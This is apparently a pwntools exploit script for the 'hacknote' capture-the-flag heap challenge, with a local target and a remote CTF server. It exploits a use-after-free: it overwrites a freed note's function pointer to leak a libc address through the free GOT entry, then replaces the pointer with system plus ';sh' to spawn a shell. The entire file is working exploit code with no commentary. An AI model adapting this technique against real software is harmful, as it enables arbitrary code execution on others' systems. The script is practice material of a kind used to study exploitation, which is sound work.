#!/usr/bin/env python
# coding=utf-8
from pwn import *
local =1
debug =1
context.terminal=['tmux',"splitw","-h"]
if local:
    a=process("./hacknote")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("111.198.29.45","32069")
    libc=ELF("./libc-2.23.so")
if debug:
    gdb.attach(a,'''
 b *0x80488A3
 b *0x80487D2
              ''')
#malloc b *0x80487D2            
   
elf=ELF("./hacknote")

def menu(index):
    a.recvuntil("Your choice :")
    a.send(str(index))
def add(size,content):
    menu(1)
    a.recvuntil("Note size :")
    a.send(str(size))
    a.recvuntil("Content :")
    a.send(content)
def printf(index):
    menu(3)
    a.recvuntil("Index :")
    a.send(str(index))
def delete(index):
    menu(2)
    a.recvuntil("Index :")
    a.send(str(index))

add(32,"aaaa")#index 0
add(32,"aaaa")#index 1

delete(0)

delete(1)
puts=0x804862B
read_got=elf.got["free"]
payload=p32(puts)+p32(read_got) #modify chunk 0
add(8,payload)#index 2
printf(0)
libc_base=u32(a.recv(4))-libc.symbols["free"]
system_addr=libc_base+libc.symbols["system"]
success("libc_base ==> 0x%x"%libc_base)
success("system_addr ==> 0x%x"%system_addr)
add(32,"aaaa")#index3
delete(3)
delete(1)
add(8,p32(system_addr)+";sh\x00")
printf(0)
a.interactive()
